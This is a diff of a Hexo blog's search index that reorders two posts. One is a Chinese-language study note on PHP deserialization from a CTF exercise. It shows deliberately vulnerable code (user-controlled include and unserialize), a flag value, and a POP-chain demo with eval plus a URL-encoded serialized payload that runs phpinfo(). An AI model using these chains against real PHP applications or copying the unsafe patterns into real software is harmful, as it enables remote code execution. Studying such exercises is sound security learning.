@@ -1,22 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/blog/2026/05/14/hello-world/</url>
-    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new post$ hexo new &quot;My New Post&quot;
+    <title>操作案例</title>
+    <url>/blog/2026/05/14/project/</url>
+    <content><![CDATA[php反序列化初步体验#3.php&lt;?php$txt = $_GET[&quot;txt&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($txt) &amp;&amp; (file_get_contents($txt, &#x27;r&#x27;) === &quot;welcome to the bugkuctf&quot;))&#123;    echo &quot;hello friend!&lt;br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;, $file))    &#123;        echo &quot;不能现在就给你flag哦&quot;;        exit();    &#125;    else    &#123;        // 文件包含 包含的数据 用户可控        include($file);        // $password 就要是一个对象了 $password 就要用户传递一个序列化的值        $password = unserialize($password);        // 触发__tostring        echo $password;    &#125;&#125;else&#123;    echo &quot;you are not the number of bugku ! &quot;;&#125;?&gt;
 
-More info: Writing
-Run server$ hexo server
+#hint.php&lt;?phpclass Flag&#123;//flag.php    public $file;    // 这里有点问题 第一__tostring  file_get_contents 我们的目标是读文件 $file    public function __tostring()&#123;        if(isset($this-&gt;file))&#123;            echo file_get_contents($this-&gt;file);            echo &quot;&lt;br&gt;&quot;;            return (&quot;good&quot;);        &#125;    &#125;&#125;?&gt;
 
-More info: Server
-Generate static files$ hexo generate
+#flag.txtFlag&#123;165151daw1d51ad951&#125;
 
-More info: Generating
-Deploy to remote sites$ hexo deploy
 
-More info: Deployment
+POP链demo2.php&lt;?phpclass main &#123;    protected $ClassObj;    function __construct() &#123;        $this-&gt;ClassObj = new normal();    &#125;    function __destruct() &#123;        $this-&gt;ClassObj-&gt;action();    &#125;&#125;class normal &#123;    function action() &#123;        echo &quot;hello bmjoker&quot;;    &#125;&#125;class evil &#123;    private $data;    function action() &#123;        eval($this-&gt;data);    &#125;&#125;//$a = new main();unserialize($_GET[&#x27;a&#x27;]);?&gt;
+
+
+
+#构造payload&lt;?phpclass main&#123;    protected $ClassObj;    function __construct()&#123;        $this-&gt;ClassObj = new evil();    &#125;&#125;class evil&#123;    private $data;    function __construct()&#123;        $this-&gt;data = &#x27;phpinfo();&#x27;;    &#125;&#125;$a = new main();echo urlencode(serialize($a));		#由于私有变量和保护变量会给加/00，因此需要更改成urlencode编码?&gt;O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
+
+
 ]]></content>
+      <categories>
+        <category>操作</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
   </entry>
   <entry>
     <title>网安学习</title>
@@ -185,28 +192,21 @@ __invoke()
       </tags>
   </entry>
   <entry>
-    <title>操作案例</title>
-    <url>/blog/2026/05/14/project/</url>
-    <content><![CDATA[php反序列化初步体验#3.php&lt;?php$txt = $_GET[&quot;txt&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($txt) &amp;&amp; (file_get_contents($txt, &#x27;r&#x27;) === &quot;welcome to the bugkuctf&quot;))&#123;    echo &quot;hello friend!&lt;br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;, $file))    &#123;        echo &quot;不能现在就给你flag哦&quot;;        exit();    &#125;    else    &#123;        // 文件包含 包含的数据 用户可控        include($file);        // $password 就要是一个对象了 $password 就要用户传递一个序列化的值        $password = unserialize($password);        // 触发__tostring        echo $password;    &#125;&#125;else&#123;    echo &quot;you are not the number of bugku ! &quot;;&#125;?&gt;
+    <title>Hello World</title>
+    <url>/blog/2026/05/14/hello-world/</url>
+    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post$ hexo new &quot;My New Post&quot;
 
-#hint.php&lt;?phpclass Flag&#123;//flag.php    public $file;    // 这里有点问题 第一__tostring  file_get_contents 我们的目标是读文件 $file    public function __tostring()&#123;        if(isset($this-&gt;file))&#123;            echo file_get_contents($this-&gt;file);            echo &quot;&lt;br&gt;&quot;;            return (&quot;good&quot;);        &#125;    &#125;&#125;?&gt;
+More info: Writing
+Run server$ hexo server
 
-#flag.txtFlag&#123;165151daw1d51ad951&#125;
+More info: Server
+Generate static files$ hexo generate
 
+More info: Generating
+Deploy to remote sites$ hexo deploy
 
-POP链demo2.php&lt;?phpclass main &#123;    protected $ClassObj;    function __construct() &#123;        $this-&gt;ClassObj = new normal();    &#125;    function __destruct() &#123;        $this-&gt;ClassObj-&gt;action();    &#125;&#125;class normal &#123;    function action() &#123;        echo &quot;hello bmjoker&quot;;    &#125;&#125;class evil &#123;    private $data;    function action() &#123;        eval($this-&gt;data);    &#125;&#125;//$a = new main();unserialize($_GET[&#x27;a&#x27;]);?&gt;
-
-
-
-#构造payload&lt;?phpclass main&#123;    protected $ClassObj;    function __construct()&#123;        $this-&gt;ClassObj = new evil();    &#125;&#125;class evil&#123;    private $data;    function __construct()&#123;        $this-&gt;data = &#x27;phpinfo();&#x27;;    &#125;&#125;$a = new main();echo urlencode(serialize($a));		#由于私有变量和保护变量会给加/00，因此需要更改成urlencode编码?&gt;O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
-
-
+More info: Deployment
 ]]></content>
-      <categories>
-        <category>操作</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
   </entry>
 </search>
